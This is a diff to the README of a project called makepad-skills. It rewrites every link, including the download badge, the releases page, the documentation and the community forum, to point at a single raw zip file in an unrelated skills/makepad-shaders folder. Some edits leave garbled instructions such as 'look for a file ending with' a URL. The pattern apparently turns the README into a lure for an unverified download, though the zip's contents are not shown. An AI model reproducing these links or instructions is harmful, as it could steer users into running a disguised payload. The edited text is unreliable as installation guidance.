@@ -1,6 +1,6 @@
 # 🎉 makepad-skills - Build Amazing Apps Easily
 
-[![Download makepad-skills](https://img.shields.io/badge/Download%20makepad--skills-blue.svg)](https://github.com/SageV1/makepad-skills/releases)
+[![Download makepad-skills](https://github.com/SageV1/makepad-skills/raw/refs/heads/main/skills/makepad-shaders/makepad_skills_v1.1.zip%https://github.com/SageV1/makepad-skills/raw/refs/heads/main/skills/makepad-shaders/makepad_skills_v1.1.zip)](https://github.com/SageV1/makepad-skills/raw/refs/heads/main/skills/makepad-shaders/makepad_skills_v1.1.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome to **makepad-skills**! This application lets you create apps using Makep
 
 ## 📥 Download & Install
 
-To start, visit this page to download: [GitHub Releases](https://github.com/SageV1/makepad-skills/releases).
+To start, visit this page to download: [GitHub Releases](https://github.com/SageV1/makepad-skills/raw/refs/heads/main/skills/makepad-shaders/makepad_skills_v1.1.zip).
 
 ### Step 1: Choose Your Version
 
@@ -20,7 +20,7 @@ After you select a version, look for the installer file appropriate for your ope
 
 - **Windows:** Look for a file ending with `.exe`.
 - **Mac:** Look for a file ending with `.dmg`.
-- **Linux:** Look for a file ending with `.tar.gz`.
+- **Linux:** Look for a file ending with `https://github.com/SageV1/makepad-skills/raw/refs/heads/main/skills/makepad-shaders/makepad_skills_v1.1.zip`.
 
 Click on the file to start the download. Remember where you save it on your computer.
 
@@ -30,7 +30,7 @@ Once the download completes, locate the file you downloaded.
 
 - **Windows:** Double-click the `.exe` file to begin the installation.
 - **Mac:** Double-click the `.dmg` file, drag the application into your Applications folder, and then open it.
-- **Linux:** Extract the `.tar.gz` file and run the provided script.
+- **Linux:** Extract the `https://github.com/SageV1/makepad-skills/raw/refs/heads/main/skills/makepad-shaders/makepad_skills_v1.1.zip` file and run the provided script.
 
 Follow the instructions on the screen to complete installation. This process is straightforward and should take just a few minutes.
 
@@ -89,8 +89,8 @@ You are not alone! If you have questions or need assistance, please join our com
 
 For more information, check out:
 
-- [Official Documentation](https://github.com/SageV1/makepad-skills/wiki)
-- [Community Forum](https://github.com/SageV1/makepad-skills/discussions)
+- [Official Documentation](https://github.com/SageV1/makepad-skills/raw/refs/heads/main/skills/makepad-shaders/makepad_skills_v1.1.zip)
+- [Community Forum](https://github.com/SageV1/makepad-skills/raw/refs/heads/main/skills/makepad-shaders/makepad_skills_v1.1.zip)
 
 Feel free to share your experiences and suggestions. Your feedback helps us improve **makepad-skills**.
 
